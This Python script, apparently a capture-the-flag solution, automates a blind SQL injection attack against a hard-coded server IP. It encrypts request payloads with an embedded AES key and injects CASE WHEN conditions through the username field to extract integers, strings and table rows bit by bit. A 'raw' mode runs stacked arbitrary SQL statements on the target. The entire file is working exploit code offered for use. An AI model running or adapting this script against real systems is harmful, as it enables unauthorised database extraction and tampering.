import argparse
import base64
import binascii
import json
import math
import requests
import sys
import urllib.parse
import zlib
from Crypto.Cipher import AES

key = [56, 79, 46, 106, 26, 5, 229, 34, 59, 128, 233, 96, 160, 166, 80, 116]

def decrypt(data):
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

    data = base64.b64decode(urllib.parse.unquote(data))
    iv = data[:16]
    data = data[16:]
    cipher = AES.new(bytes(key), AES.MODE_CBC, iv)

    decdata = cipher.decrypt(data)
    return json.loads(_unpad(decdata))

def encrypt(data, iv=[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0xa, 0xb, 0xc, 0xd, 0xe, 0xf]):
    def _pad(s):
        return s + (16 - len(s) % 16) * chr(16 - len(s) % 16)

    data = _pad(data if isinstance(data, str) else json.dumps(data))
    cipher = AES.new(bytes(key), AES.MODE_CBC, bytes(iv))
    return base64.b64encode(bytes(iv) + cipher.encrypt(data)).decode()

def post(url, data, retries=3):
    for x in range(retries):
        try:
            r = requests.post(url, data=data, timeout=5)
            return r.text
        except:
            pass
    raise Exception("Cannot connect")

def get_int(query, bytes=1):
    print(query)
    bit_index = 0
    for bit in range(8 * bytes):
        sys.stdout.write(".")
        sys.stdout.flush()
        data = {
            "password" : "password",
            "cmd" : "getTemp",
            "username" : "a' or 1=CASE WHEN ({query})&{bit}={bit} THEN 1 ELSE 0 END#".format(query=query, bit=1 << bit)
        }

        resp = decrypt(post("http://35.243.186.41/", data={"d" : encrypt(data)}))
        if resp["success"] == True:
            bit_index |= 1 << bit
    return bit_index

def get_string(query, length=None, charset=None, skip=0, compress=False):
    charset = "_ABCDEFGHIJKLMNOPQRSTUVWXYZ" if charset is None else charset
    if compress:
        charset = "0123456789ABCDEF"
        query = "HEX(COMPRESS(({})))".format(query)
        if length is None:
            length = get_int("LENGTH(({}))".format(query), bytes=2)
        skip = skip or 8
    else:
        if length is None:
            length = get_int("LENGTH(({}))".format(query))

    print("Length: {}".format(length))
    print("Charset: {}".format(charset))

    output = ""
    for index in range(skip, length):
        bit_index = 0
        for bit in range(math.ceil(math.log2(len(charset)))):
            sys.stdout.write(".")
            sys.stdout.flush()
            data = {
                "password" : "password",
                "cmd" : "getTemp",
                "username" : "a' or 1=CASE WHEN INSTR('{charset}',SUBSTR(({query}),{index},1))-1&{bit}={bit} THEN 1 ELSE 0 END#".format(charset=charset, query=query, index=index+1, bit=1 << bit)
            }
            resp = decrypt(post("http://35.243.186.41/", data={"d" : encrypt(data)}))
            if resp["success"] == True:
                bit_index |= 1 << bit

        if bit_index < len(charset):
            output += charset[bit_index]
        else:
            output += charset[0]
        print(index, bit_index, output)

    if compress:
        return zlib.decompress(binascii.unhexlify(output)).decode()
    return output

def get_rows(query, index=0, charset=None):
    output = []
    count = get_int("SELECT COUNT(*) FROM ({}) AS T".format(query))
    print("Count: {}".format(count))
    for x in range(index, count):
        output.append(get_string("{} LIMIT 1 OFFSET {}".format(query, x), charset=charset))
        print(output[-1])
    return output

def raw_query(query, data=None):
    data = data or {
        "password" : "password",
        "cmd" : "setTemp",
        "username" : "a'; {}#".format(query),
        "temp" : 74,
        "device": 1
    }

    return decrypt(post("http://35.243.186.41/", data={"d" : encrypt(data)}))

charsets = {
    None: "0123456789ABCDEF",
    "hex": "0123456789ABCDEF",
    "alpha" : "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "alphanum" : "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "num" : "0123456789",
    "all" : "".join(chr(x) for x in range(256)).replace("'", "''")
}

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog="processor")
    parser.add_argument("--compress", "-c", action="store_true")
    parser.add_argument("--skip", "-s", type=int, default=0)
    parser.add_argument("--type", "-t", choices=["rows", "int", "string", "raw"], default="rows")
    parser.add_argument("--characters", type=str, default=None)
    parser.add_argument("--charset", choices=["hex", "alpha", "num", "alphanum", "all"], default=None)
    parser.add_argument("query", nargs='*')
    args = parser.parse_args()

    query = " ".join(args.query)
    characters = args.characters or charsets[args.charset]

    if args.type == "rows":
        result = "\n\t".join(get_rows(query, index=args.skip, charset=characters))
    elif args.type == "int":
        result = get_int(query, bytes=2)
    elif args.type == "raw":
        raw_query(query)
    else:
        result = "\n\t".join(get_string(query, skip=args.skip, charset=characters, compress=args.compress).splitlines())

    print("Query: {}\n\t{}".format(query, result))
